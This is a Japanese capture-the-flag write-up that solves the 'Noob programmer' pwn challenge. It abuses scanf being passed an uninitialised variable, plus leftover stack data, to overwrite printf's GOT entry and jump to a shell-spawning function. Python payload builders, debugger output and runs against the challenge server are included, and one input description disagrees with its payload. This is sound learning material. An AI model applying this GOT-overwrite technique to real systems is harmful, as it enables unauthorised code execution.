CTFは初心者でもC言語については少々心得があるbaumroll1234です。

今回はHard問題ということもあり私にとってはめちゃくちゃ難しかったので、そのあたりの経緯も含めて詳しくまとめていこうと思います。

# Noob programmer

## 問題
初心者プログラマーが初めてC言語を書いた.
```c
// gcc -o chal main.c -no-pie -fno-stack-protector

#include <stdio.h>
#include <string.h>
#include <unistd.h>

void win() {
    execve("/bin/sh",NULL,NULL);
}

void ask_room_number() {
    long age;
    printf("Input your room number> ");
    scanf("%ld",age);
    printf("Ok! I'll visit your room!");
}

void show_welcome() {
    char name[0x20];
    printf("Input your name> ");
    fgets(name,sizeof(name),stdin);
    printf("Welcome! %s",name);
}

int main(void) {
    /* disable stdio buffering */
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    show_welcome();
    ask_room_number();

    return 0;
}

```

## 方針

ask_room_number関数のscanfの実装バグを利用して、~~ask_room_numberの戻り先アドレス~~printfのGOTエントリを書き換える。

## 解法

例によってwin関数はどこからも呼び出されていません。

main関数では、show_welcome関数とask_room_number関数が呼び出されているだけです。

よって、何かしらのトリックを使ってどこかからwin関数に飛ぶ必要があります。

show_welcome関数については、特におかしな点はなさそうです。

文字読み込みもscanfでなくfgetsを使っていてしっかり文字数制限も設定してあります。

次にask_room_number関数を見てみましょう。
```c
void ask_room_number() {
    long age;
    printf("Input your room number> ");
    scanf("%ld",age);
    printf("Ok! I'll visit your room!");
}
```
ask_room_numberといっているのに変数名がageになっているところも非常にツッコみたいところではありますが、今回の問題を解く上では全く関係なさそうです。

それよりもこのNoob programmer(初心者プログラマー)、もっと大きいミスをやらかしています。

それがここ。
```c
    scanf("%ld",age);
```
scanfの第2引数以降に渡すのは変数そのものではなく変数のアドレスです。

※アドレスを渡さないとscanf関数の本体が入力値をどこに書きこめばいいかわからないですよね。

show_welcomeのnameのような配列であれば、そのまま配列名nameを渡せばいいです。（C言語では配列名はその配列の先頭のアドレスを意味するため。）

ですが、単体の変数の場合は
```c
    scanf("%ld",&age);
```
のように、&をつけて変数のアドレスを渡すのが正しい書き方です。確かに初心者がやりがちなやつです。

実際、実行しててきとーな値を入力してみると、
```sh
Input your name> baumroll1234
Welcome! baumroll1234
Input your room number> 506
Segmentation fault (コアダンプ)
```
バグっていることがわかります。

### 攻め口を考えてみる

scanf("%ld",age);は、age変数ではなくage変数の内容が指す場所に入力値を書き込んでしまいます。

ということは、もしage変数の内容を任意の値に設定することができたら、好きな場所に好きな値を書き込むことができることになります。

しかし、それより前に正しいscanf("%ld",&age);のような処理は無いようです。

なんとかしてage変数の場所に任意の値を差し込めないものでしょうか？

ここで、show_welcome関数が呼び出されてからのスタックの変化を追ってみましょう。

まず、[Disappeared](https://github.com/baumroll0928-spec/myRepository/tree/main/DailyAlpacaHack/p20260218#pos%E3%81%AE%E5%80%A4%E3%82%92%E6%B1%82%E3%82%81%E3%82%8B)のときに詳しく書いたように、show_welcome関数が呼び出されると、スタックはこんな感じになります。
```
↑高アドレス
------------------------- <- 元のベースポインタ
・・・
-------------------------
show_welcomeの戻り先
-------------------------
元のベースポインタ
------------------------- <- ベースポインタ
name[31]
～
name[0]
-------------------------
？？？
------------------------- <- スタックポインタ
↓低アドレス
```
show_welcome関数が終わると、確保していた領域は解放されますが、このとき書き込まれてい値は初期化されたりすることはなく、いわゆるゴミデータとして残ります。
```
↑高アドレス
------------------------- <- ベースポインタ
・・・
------------------------- <- スタックポインタ
show_welcomeの戻り先
-------------------------
元のベースポインタ
-------------------------
name[31]
～
name[0]
-------------------------
？？？
-------------------------
↓低アドレス
```
続けてask_room_number関数が呼び出されると、こんな感じになります。
```
↑高アドレス
------------------------- <- 元のベースポインタ
・・・
-------------------------
ask_room_numberの戻り先
-------------------------
元のベースポインタ
------------------------- <- ベースポインタ
age
-------------------------
？？？
------------------------- <- スタックポインタ
name[15]
～
name[0]
-------------------------
？？？
-------------------------
↓低アドレス
```
先ほどの図と見比べてみると、name[31]～name[24]の部分がageと重なっていることがわかります。

※Disappearedの時と違ってローカル領域が退避ベースポインタと隣接しているのは、-fno-stack-protectorオプションがついているからですね。

C言語は変数を宣言しただけでは初期化されないので、前のゴミデータが残っています。

よって、このname[24]～name[31]にリトルエンディアン（下位のバイトが先）でバイナリデータを仕込むことで、好きな場所に好きな値を書き込む準備ができました。

※厳密にはC言語の文字の終端はNULLバイト（0x00）なので、name[31]だけは任意の値を仕込めませんが。

さて、どこに何を書きこめばいいのでしょうか？

### 案１：ask_room_numberの戻り先の場所をwin関数のアドレスに書き換える

ask_room_numberが終わった時にmain関数の呼び出し元の次ではなくwin関数の頭に飛ぶように戻り先を書き換えてみようと考えました。

まず、win関数のアドレスを調べます。

```sh
$ nm chal | grep win
00000000004011b6 T win
```

gdbを使ってどこを書き換えればいいかを調べます。

```sh
$ gdb chal
(gdb) b ask_room_number
Breakpoint 1 at 0x4011e2
(gdb) run
Starting program: /mnt/c/temp/ctf/chal
Input your name> baumroll1234
Welcome! baumroll1234

Breakpoint 1, 0x00000000004011e2 in ask_room_number ()
(gdb) info frame
Stack level 0, frame at 0x7fffffffddc0:
 rip = 0x4011e2 in ask_room_number; saved rip = 0x4012da
 called by frame at 0x7fffffffddd0
 Arglist at 0x7fffffffddb0, args:
 Locals at 0x7fffffffddb0, Previous frame's sp is 0x7fffffffddc0
 Saved registers:
  rbp at 0x7fffffffddb0, rip at 0x7fffffffddb8
```

戻り先アドレスがある場所は0x7fffffffddb8のようです。何度か実行して毎回同じだったので、たぶん固定なのでしょう。

そうだとすると、入力値はこうなります。
```
Input your name> てきとーな24文字 + 0x007fffffffddb8のバイナリ（リトルエンディアン）
Input your room number> 0x4011b6を10進数に変換したもの
```

pythonでペイロード（攻撃のために送り込むデータ）を作ってみました。
```py
b = b'baumroll123456789abcdef0'
b += bytes.fromhex('007fffffffddb8')[::-1]
b += b'\n'
b += str(0x4011b6).encode() + b'\n'
b += b'ls\n'
open('c:/temp/ctf/payload', 'wb').write(b)
```

期待に胸を膨らませながら実行してみます。
```sh
$ ./chal < payload
Input your name> Welcome! baumroll123456789abcdef0�����Input your room number> Segmentation fault (コアダンプ)
```
あれ？ダメじゃん。

ペイロードの作り方が間違っているのでしょうか？でもgdbに直接ペイロードを流し込んでみると、
```sh
$ gdb chal < payload
（略）
[Detaching after vfork from child process ****]
chal  payload
[Inferior 1 (process ****) exited normally]
```
ちゃんと通ってますね。（※これをするにはペイロードの頭にb'run\n'を入れてあげれば良いです。）

ここで勘違いをしていたことに気付きます。

-no-pieオプションを付けても、スタックは固定されるわけじゃないんですよね。

※gdbで実行するときだけ固定のようですね。

これではどこを書き換えればいいかわかりません。詰みました＼(^o^)／

しかし、ここで一つひらめきました。

パンが無いならケーキを食べればいいじゃない。

固定されないスタックを書き換えるのが無理なら、固定される場所を書き換えればいいのではないでしょうか？

### 案２：最後のprintfのcall時の飛び先を調整してwin関数に向ける

ask_room_number関数の最後に
```c
    printf("Ok! I'll visit your room!");
```
というprintf関数呼び出しがありますが、このprintfに対応するcall命令があるはずです。

そして、これらのプログラムの命令たちもメモリ上に配置されており、その場所は-no-pieオプションによって固定されるはずです。

つまり、このcall命令の飛び先をwin関数に書き換えてしまえばいいと考えました。

アセンブリを見てみます。
```sh
objdump -d chal > asm.txt
```

注目すべきはask_room_numberの最後の方にあるこれですね。
```
  401224:	e8 67 fe ff ff       	call   401090 <printf@plt>
```

この67 fe ff ffが、次の命令の位置からみたジャンプ先の相対位置（リトルエンディアン）です。

※0x401224にあるe8はcallを表す命令語なので、引数があるのは0x401225～0x401228です。

実際、
```
0000000000401090 <printf@plt>:
```
なので、
```
16進数: 0x00401090 - 0x00401229 = 0xfffffe67
10進数:    4198544 -    4198697  =      -409
```
となっています。

win関数はprintf@pltより
```
0x4011b6 - 0x401090 = 0x126
```
だけ上の位置（アセンブリでいうと後の方）にあります。これを本来の引数に足すと、
```
0xfffffe67 + 0x126 = 0xffffff8d
```
になるので、入力値はこうなります。
```
Input your name> てきとーな24文字 + 0x00000000401225のバイナリ（リトルエンディアン）
Input your room number> 0xffffff8dを10進数に変換したもの
```
これに合わせてペイロードも修正します。
```py
b = b'baumroll123456789abcdef0'
b += bytes.fromhex('00000000401225')[::-1]
b += b'\n'
b += str(0xffffff8d).encode() + b'\n'
b += b'ls\n'
open('c:/temp/ctf/payload', 'wb').write(b)
```
今度こそうまくいくでしょうか？
```sh
f$ ./chal < payload
Input your name> Welcome! baumroll123456789abcdef0%@Input your room number> Segmentation fault (コアダンプ)
```
ダメでしたー！

調べてみたところ、コード領域にはプロテクトがかかることがわかりました。

はい、詰みました＼(^o^)／（２回目）

ここでふと、printf@pltの中に興味深い部分があることに気付きました。
```
0000000000401090 <printf@plt>:
  401090:	f3 0f 1e fa          	endbr64
  401094:	ff 25 6e 2f 00 00    	jmp    *0x2f6e(%rip)        # 404008 <printf@GLIBC_2.2.5>
  40109a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
```

jmp命令がある！？

普段こんなところは見ませんが、もう八方ふさがりなので、一縷の望みをかけて詳しく探ってみることにしました。

### 案３：printf@pltのjmp命令の飛び先をwin関数のアドレスに書き換える

調べてみると、@pltの関数が呼び出されたとき、実際の命令群が配置された場所に飛び、そこで処理が行われるようです。

まあ、よく考えてみたら、printfのあの複雑な処理をこれだけの命令で表せないですよね。

もう一度さっきのjmp命令のところをよく見てみます。
```
  401094:	ff 25 6e 2f 00 00    	jmp    *0x2f6e(%rip)        # 404008 <printf@GLIBC_2.2.5>
```
ジャンプ先が相対参照になっています。

これは、RIP（次の命令のアドレス）からの相対位置に書かれた値を見て、そこに飛ぶということです。

右にコメントで# 404008と書いてありますが、これは、
```
0x40109a + 0x2f6e = 0x404008
```
ということです。

よって、0x404008に飛ぶ・・・ではなく、0x404008にprintfの実体が置かれている飛び先が書いてあるということです。

この0x404008のことを、GOT (Global Offset Table)といい、そこに書かれた値をGOTエントリというらしいです。

※GOTはゴットではなくそのままジーオーティーと読むのが一般的のようです。

GOTは-no-pieオプションによって固定され、かつ、そこはコード領域ではなくデータ領域なので、書き換えることができそうです。

そうすると、入力値はこうなります。
```
Input your name> てきとーな24文字 + 0x00000000404008のバイナリ（リトルエンディアン）
Input your room number> 0xffffff8dを10進数に変換したもの
```
ペイロードも修正します。
```py
b = b'baumroll123456789abcdef0'
b += bytes.fromhex('00000000404008')[::-1]
b += b'\n'
b += str(0x4011b6).encode() + b'\n'
b += b'ls\n'
open('c:/temp/ctf/payload', 'wb').write(b)
```
今度こそうまくいってほしいです。（祈り）
```sh
$ ./chal < payload
Input your name> Welcome! baumroll123456789abcdef@@Input your room number> chal  payload
```
きた！！きました！！

さっそく本番環境でも実行してみることにします。
```sh
$ nc 34.170.146.252 17684 < payload
Input your name> Welcome! baumroll123456789abcdef@@Input your room number> bin
boot
dev
etc
flag.txt
（略）
var
```

flag.txtを表示するようにb += b'ls\n'をb += b'cat flag.txt\n'にしてもう一度実行します。
```sh
$ nc 34.170.146.252 17684 < payload
Input your name> Welcome! baumroll123456789abcdef@@Input your room number> Alpaca{**********************************************************}
```
無事フラグをゲットできました。

最後に、今回の攻撃の流れをおさらいしましょう。
* プログラムがユーザーにnameの入力を求める。
* 攻撃者はname[24]～name[31]がprintf@pltのGOTを指すようにデータを注入する。
* プログラムがユーザーにage(?)の入力を求める。
* 攻撃者はprintf@pltのGOTエントリがwin関数のアドレスを指すようにデータを注入する。
* プログラムはprintf@pltに飛んだあとprintfの実体に飛ぼうとして騙されてwin関数に飛んでしまう。
* 攻撃者はシェルを取る。

## その他

最初はわりと簡単かと思ったこの問題、進めるにつれて難問であることが発覚していきました。

また、問題を解いていく過程でさまざまなことについて学ぶことができました。

まだまだ難しい問題も出てくるでしょうし、この[Daily AlpacaHack](https://alpacahack.com/daily)の問題を解きながらもっと精進していこうと思います。
